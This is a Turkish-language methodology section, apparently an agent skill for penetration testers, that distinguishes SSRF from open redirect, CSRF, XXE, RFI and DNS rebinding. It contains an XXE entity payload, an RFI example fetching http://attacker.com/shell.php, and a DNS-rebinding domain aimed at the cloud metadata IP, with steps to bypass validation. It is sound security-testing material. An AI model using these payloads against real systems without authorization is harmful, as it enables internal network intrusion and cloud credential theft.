## 3. Source → Transformation → SSRF Sink Modellemesi

Bir adayı test etmeden önce şu soruyu açıkça sor: **"Bu input gerçekten
sunucunun kendisinin başlattığı bir outbound network isteğinin hedefini
mi belirliyor, yoksa yalnızca bir istemci/tarayıcı davranışını mı
etkiliyor?"**

```
(A) SSRF'e yol açabilecek akış:
parameter → controller → HTTP client kütüphanesi (örn. Java
   HttpClient/OkHttp, Python requests, Node axios/fetch, PHP cURL)
   .get(user_input)   [sink — SUNUCUNUN KENDİSİ bu adrese bağlanır]

(B) SSRF'e yol açmayan akış (aynı parametre olsa bile):
parameter → controller → HTTP response header (Location:) →
   TARAYICI bu adrese yönlenir — sunucu hiçbir zaman bu adrese
   bağlanmaz (bu Open Redirect'tir, §3.1)
```

**Pratik ayrım testi:** Kendi kontrolündeki bir domain (interactsh,
bkz. §9.3) ver ve **sunucu tarafında** (network seviyesinde, ağ
trafiği/DNS log'u üzerinden) bir bağlantı denemesi olup olmadığını
gözlemle. Yalnızca `Location:`/`Refresh:` header'ında görünüp
tarayıcı console'unda bir client-side redirect olarak tetikleniyorsa
→ SSRF değil.

### 3.1 Open Redirect ile Ayrım

| | Open Redirect | SSRF |
|---|---|---|
| Kim bağlanıyor | **Tarayıcı/istemci** | **Sunucunun kendisi** |
| Tipik sink | `Location:` header'ı, `<meta refresh>`, `window.location` | Sunucu tarafı HTTP client kütüphanesi çağrısı |
| Saldırganın kazancı | Phishing/oltalama (kullanıcıyı kandırmak), OAuth token hırsızlığı zinciri | Internal network erişimi, cloud credential hırsızlığı, internal servis exploitation |
| Doğrulama yöntemi | Tarayıcıda/response header'da yönlendirme hedefinin gözlemlenmesi | Sunucu tarafında outbound bağlantı kanıtı (OOB/timing/response içeriği) |
| Aynı parametrede birlikte bulunabilir mi | Evet — bir `redirect_url` parametresi hem tarayıcıyı yönlendirebilir hem de sunucu tarafında ayrıca bir doğrulama/preview isteği tetikleyebilir (iki ayrı bulgu olarak raporlanmalı) | — |

**Kritik pratik fark:** Bir "redirect" parametresinin **sunucu
tarafında da** işlendiğini (örn. "hedef URL'in geçerli olup olmadığını
kontrol etmek için önce sunucu bir HEAD isteği atıyor") tespit etmek,
aynı parametreyi hem Open Redirect hem SSRF olarak iki ayrı bulgu
haline getirebilir — bu senaryo sık karşılaşılan ve raporlarken
netleştirilmesi gereken bir örtüşmedir.

### 3.2 CSRF ile Ayrım

CSRF (Cross-Site Request Forgery), kurbanın **tarayıcısını** ve
**kurbanın kendi kimlik bilgilerini** (cookie/session) kullanarak
üçüncü bir sunucuya (genelde hedef uygulamanın kendisine, farklı bir
domain'e değil) sahte bir istek yaptırmaktır — tehdit modeli **"kurbanın
tarayıcısı saldırganın seçtiği bir isteği, kurbanın kimliğiyle
gönderir"**dir. SSRF'de ise istek **hedef sunucunun kendisi**
tarafından, **sunucunun kendi ağ konumundan/kimliğinden** (cloud IAM
rolü, internal network erişimi) gönderilir. Bu iki sınıf birbirinden
tamamen farklı bir tehdit modeline sahiptir ve neredeyse hiçbir zaman
karıştırılmaz — bu skill yalnızca netlik için ayrımı burada
belgeler, ayrı bir pratik test prosedürü gerektirmez.

### 3.3 XXE-Tabanlı SSRF ile Overlap (KRİTİK — Ayrı Bir Skill'e Devir Noktası)

XML parser'ların **external entity** (harici varlık) çözümleme
özelliği, klasik bir SSRF **vektörü** olarak kullanılabilir:

```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<canary>.oast.fun"> ]>
<root>&xxe;</root>
```

**Bu skill'in tuttuğu sınır:** Kök neden ve tespit/exploitation
metodolojisi (DTD işleme, entity expansion, parser-özgü
konfigürasyon bayrakları — `disallow-doctype-decl`,
`external-general-entities` vb.) tamamen **XML parser'a özgü**dür ve
ayrı bir XXE skill'inin kapsamındadır. **Bu skill'in kapsamı**,
XXE zinciri **sonucunda** ortaya çıkan network isteğinin **hedefini**
(internal servis, cloud metadata) test etme ve exploitation
aşamasıdır — yani XXE, bu skill için yalnızca **alternatif bir
delivery mekanizmasıdır** (tıpkı §11'de GraphQL'in bir delivery
mekanizması olarak ele alınması gibi). Pratik kural: Sink **gerçekten**
bir XML parser'ın DTD/ENTITY çözümleme mekanizması ise → önce XXE
skill'inin detection/confirmation metodolojisini uygula; XXE
confirmed olduktan **sonra**, elde edilen "harici istek attırma"
kapasitesini bu skill'deki §12 (Protokol/Hedef Profilleri) ile
birleştirerek internal network/cloud metadata hedeflemesi yap.

**Sık yapılan hata — SVG/HTML'in normal kaynak yüklemesiyle
karıştırmama:** Bir SVG dosyasındaki `<image href="...">` gibi bir
harici kaynak referansı **DTD/ENTITY işlemez** — bu, renderer'ın
kendi doğrudan href çözümlemesidir ve **XXE değildir**, doğrudan bu
skill'in kapsamındadır (ayrıntılı ayrım ve pratik test için bkz. §9.2).

### 3.4 RFI/LFI ile Ayrım

RFI (Remote File Inclusion), sunucunun uzak bir URL'i **kod olarak
çalıştırmak üzere** include etmesidir (örn. PHP'de
`include($_GET['page'])` ile `http://attacker.com/shell.php`
çekilip **çalıştırılması**) — nihai etki doğrudan RCE'dir. SSRF'de
ise sunucu hedef URL'in içeriğini yalnızca **veri olarak** işler
(bir resmi indirir, bir sayfayı render eder, bir API'ye proxy'ler) —
kod olarak çalıştırmaz. Aradaki çizgi bazen incelir: bir SSRF
zincirinin sonunda hedef içerik bir template/config dosyası olarak
**yeniden yorumlanıyorsa** (örn. bir SSRF ile internal bir config
endpoint'inden çekilen içerik uygulamanın kendi config parser'ına
besleniyorsa) bu, SSRF'nin bir **impact yükseltmesi** olarak
raporlanır (§10.4), ayrı bir RFI bulgusu olarak değil — kök neden
(sunucunun URL'e istek atması) hâlâ SSRF'dir.

### 3.5 DNS Rebinding — Ayrı Bir Sınıf Değil, Bir Bypass Tekniği

DNS rebinding (bir domain'in DNS TTL süresi çok kısa tutularak,
"validation" isteği sırasında zararsız bir IP, **asıl** istek
sırasında ise internal bir IP döndürülmesi), SSRF'nin **kendisi
değil**, "URL'i önce doğrula sonra kullan" (TOCTOU — time-of-check
to time-of-use) tarzı savunmaları atlatmak için kullanılan bir
**bypass tekniğidir**. Bu skill'de ayrı bir üst başlık olarak değil,
§8.2'deki bypass taksonomisinin bir kategorisi olarak ele alınır
(bkz. B7).

**Pratik uygulama — kendi DNS altyapısını kurmadan hazır bir
rebinding servisi kullanma:** Bazı halka açık rebinding servisleri,
domain adının kendisine hedef IP'leri encode ederek anında
kullanılabilir bir rebinding domain'i üretir — bu, kendi DNS
sunucusunu/kaydını yapılandırma ihtiyacını ortadan kaldırır:
```
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```
Bu domain, ardışık DNS sorgularında dönüşümlü olarak `1.2.3.4`
(zararsız/dış IP, validation adımını geçmek için) ve
`169.254.169.254` (asıl hedef) döndürür — `nslookup` ile birkaç kez
sorgulanarak davranış doğrulanabilir. **Not:** Bu tür halka açık
servislerin domain sözdizimi zamanla değişebilir/servis çevrimdışı
kalabilir — kullanmadan önce `1u.ms` (veya güncel eşdeğeri) için
`nslookup`/`dig` ile birkaç ardışık sorgu atıp gerçekten iki farklı
IP döndürdüğünü **testin başında doğrula**, format farklıysa
servisin o anki kendi dokümantasyonuna/ana sayfasına bakılmalı.

**Adım adım pratik confirmation akışı (hazır servis veya kendi
altyapınla):**
```
1. Rebinding domain'ini hazırla (1u.ms deseni veya Singularity of
   Origin ile kendi domain'in) — dönüşümlü IP çifti: (zararsız IP,
   hedef internal IP)
2. dig/nslookup ile art arda 3-5 sorgu at, domain'in gerçekten
   dönüşümlü cevap verdiğini doğrula (TTL değerinin çok düşük —
   genelde 0-1 saniye — olduğunu da not et)
3. Bu domain'i SSRF sink'ine payload olarak ver (§5 generic detection
   ile aynı canary-gönderme mantığı, ama URL SABİT kalır — TTL/DNS
   davranışı zamanla değişir, URL'in kendisi değişmez)
4. Eğer sink "önce doğrula sonra kullan" (TOCTOU) modeli
   uyguluyorsa: validation adımı muhtemelen ilk DNS cevabını (zararsız
   IP) alıp geçer; TTL süresi dolduktan SONRA yapılan asıl istek
   (uygulamanın gerçek outbound çağrısı)ikinci DNS sorgusunu tetikler
   ve bu kez internal IP dönebilir
5. Confirmation: interactsh-tabanlı standart OOB yöntemi burada
   DOĞRUDAN kullanılamaz (rebinding domain'i saldırganın interactsh
   canary'si değil, ayrı bir servis) — bunun yerine hedefin internal
   servise gerçekten ulaştığının kanıtı ya (a) response'ta internal
   servisin içeriğinin görünmesi (full SSRF) ya da (b) internal
   servis tarafında gözlemlenebilir bir yan etki (örn. bir healthcheck
   endpoint'inin loguna düşen istek, eğer buna erişim varsa) ile
   sağlanır — bu nedenle DNS rebinding genelde yalnızca **full/
   semi-blind** SSRF senaryolarında pratik bir confirmation yöntemidir,
   saf blind SSRF'te OOB (§9.3) hâlâ tercih edilen birincil yoldur.
```
Daha kontrollü/özelleştirilmiş bir rebinding senaryosu (özel TTL
değeri, üçten fazla IP arasında dönüşüm, kendi domain'ini kullanma
ihtiyacı) için **Singularity of Origin** (bkz. §15) gibi bir araç
kendi altyapını kurmayı sağlar.

**Önkoşul kontrolü — DNS pinning davranışı (KRİTİK, rebinding'in
başarısını doğrudan belirler):** DNS rebinding'in çalışması,
hedefin DNS çözümlemesini **her istekte yeniden mi yaptığı** yoksa
**bir kere çözüp sonucu önbelleğe (pin) mi aldığı**na bağlıdır —
bu, hedefin HTTP client'ına, işletim sistemi resolver'ına, ve
varsa OS-seviyesi DNS cache'ine (`nscd`, `systemd-resolved` vb.)
göre değişir:
- **Re-resolve modeli (rebinding çalışır):** Her yeni istekte (veya
  TTL süresi dolduğunda) DNS **yeniden** çözülür — validation ve
  asıl istek farklı IP'ler görebilir.
- **DNS pinning modeli (rebinding çalışmaz/zorlaşır):** İlk
  çözümlenen IP bir süre (bazen TTL'i bile göz ardı ederek, bazı
  JVM'lerin `networkaddress.cache.ttl` ayarı gibi) sabitlenir —
  validation ve asıl istek **aynı** IP'yi görür, TTL manipülasyonu
  işe yaramaz.
- **Test yöntemi:** Rebinding domain'ini kullanmadan önce, sabit
  (rebinding yapmayan) bir domain ile **iki ardışık istek** arasında
  DNS'in tekrar çözülüp çözülmediğini dolaylı olarak gözlemlemeye
  çalış (örn. domain'in TTL'ini kısa tutup iki istek arasında bir
  gecikme bırakarak, timing farkına bak) — bu önkoşul
  doğrulanmadan rebinding denemesi, negatif bir sonucun "koruma var"
  mı yoksa "pinning var, rebinding zaten hiç çalışmazdı" mı olduğunu
  ayırt edemez.
